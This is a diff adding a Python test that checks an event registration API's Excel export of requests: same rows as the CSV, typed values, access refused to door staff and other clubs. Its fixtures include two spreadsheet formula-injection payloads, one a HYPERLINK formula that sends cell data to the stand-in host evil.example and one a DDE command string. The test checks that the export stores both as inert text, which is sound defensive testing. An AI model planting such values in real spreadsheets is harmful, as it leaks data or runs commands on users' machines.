@@ -635,6 +635,72 @@ async def test_the_requests_export(client, session, make_club, make_event, mint_
     assert seen["requests/export"] == seen["requests"] and seen["requests"][0] in (403, 404) and seen["requests"][1] == 401
 
 
+async def test_the_requests_export_as_a_workbook(client, session, make_club, make_event, mint_token, mail, pushed):
+    """format=xlsx: the CSV's columns and rows as an Excel workbook, an
+    answer that looks like a formula kept as text (no apostrophe), numbers
+    and times typed; anything else 422; door staff refused it as they are
+    the CSV."""
+    from openpyxl import load_workbook
+
+    from tests.club_ops_helpers import member_header
+    from tests.spreadsheet_helpers import assert_same_as_csv, cell_by, records, workbook_of
+
+    w = await _club_event(session, make_club, make_event, mint_token, tag="xlsxreq", has_fee=True, reg_fee=Decimal("60.00"))
+    attack = '=HYPERLINK("http://evil.example/?"&B2,"Open")'
+    a = (await ask(client, w.event, 480, additional_details={"college": attack})).json()["approval"]["id"]
+    b = (await ask(client, w.event, 481, additional_details={"college": "+cmd|' /C calc'!A0"})).json()["approval"]["id"]
+    await ask(client, w.event, 482)
+    await approve(client, w, ids=[a])
+    await decline(client, w, ids=[b], note="Full up", notify=False)
+    path = f"{API}/events/registration/{w.event.id}/requests/export"
+
+    as_csv = await client.get(path, headers=w.h)
+    assert as_csv.status_code == 200
+    # The CSV is what it was, asked for by name or not.
+    assert (await client.get(path, params={"format": "csv"}, headers=w.h)).content == as_csv.content
+    csv_head, *csv_rows = list(csv.reader(io.StringIO(as_csv.text)))
+
+    r = await client.get(path, params={"format": "xlsx"}, headers=w.h)
+    book = workbook_of(r, f"{w.event.slug}-requests.xlsx")
+    assert r.headers["cache-control"] == "no-store"
+    sheet = book.active
+    assert sheet.title == "Registration requests" and sheet.freeze_panes == "A2" and sheet["A1"].font.b
+    assert [c.value for c in sheet[1]] == csv_head == approvals.EXPORT_LEAD + ["college"] + approvals.EXPORT_TAIL + ["Missing answers"]
+    assert_same_as_csv(sheet, as_csv.text)  # the same rows, cell for cell, in the same order
+    rows = records(sheet)
+    assert [row["Email"] for row in rows] == [row[csv_head.index("Email")] for row in csv_rows]
+    by_email = {row["Email"]: row for row in rows}
+    first = by_email["asker480@example.com"]
+    assert (first["Status"], first["Payment"], first["Amount"]) == ("Confirmed", "awaiting payment", 60)
+    assert isinstance(first["Registered at"], datetime) and isinstance(first["Pay by"], datetime) and first["WhatsApp"] == "no"
+    # The CSV defuses it with an apostrophe; the workbook stores it as text, as typed.
+    assert first["college"] == attack and by_email["asker481@example.com"]["college"] == "+cmd|' /C calc'!A0"
+    for i, row in enumerate(rows, 1):
+        if row["college"]:
+            assert cell_by(sheet, "college", i).data_type == "s"
+    # Read back with formulas on (not cached values): still no formula.
+    formulas = load_workbook(io.BytesIO(r.content)).active
+    assert all(c.data_type != "f" for row in formulas.iter_rows() for c in row)
+    assert (by_email["asker481@example.com"]["Status"], by_email["asker481@example.com"]["Decline note"]) == ("Declined", "Full up")
+    assert by_email["asker482@example.com"]["Status"] == "Under review"
+
+    bad = await client.get(path, params={"format": "pdf"}, headers=w.h)
+    assert bad.status_code == 422 and bad.json()["message"] == "Invalid request" and "format" in bad.json()["errors"]
+
+    # Door staff read the queue but take no list away, in either format.
+    door = await member_header(client, session, w.club, "door")
+    assert (await client.get(f"{API}/events/registration/{w.event.id}/requests", headers=door)).status_code == 200
+    for fmt in ("csv", "xlsx"):
+        refused = await client.get(path, params={"format": fmt}, headers=door)
+        assert refused.status_code == 403 and "attendees" not in refused.text and "asker480" not in refused.text
+    editor = await member_header(client, session, w.club, "editor")
+    workbook_of(await client.get(path, params={"format": "xlsx"}, headers=editor))
+    other = await _club_event(session, make_club, make_event, mint_token, tag="xlsxother")
+    theirs = await client.get(path, params={"format": "xlsx"}, headers=other.h)
+    client.cookies.clear()  # the members' sign-ins left their session cookie
+    assert theirs.status_code in (403, 404) and (await client.get(path, params={"format": "xlsx"})).status_code == 401
+
+
 # ─── Closeout, analytics, MCP ────────────────────────────────────────────
 
 
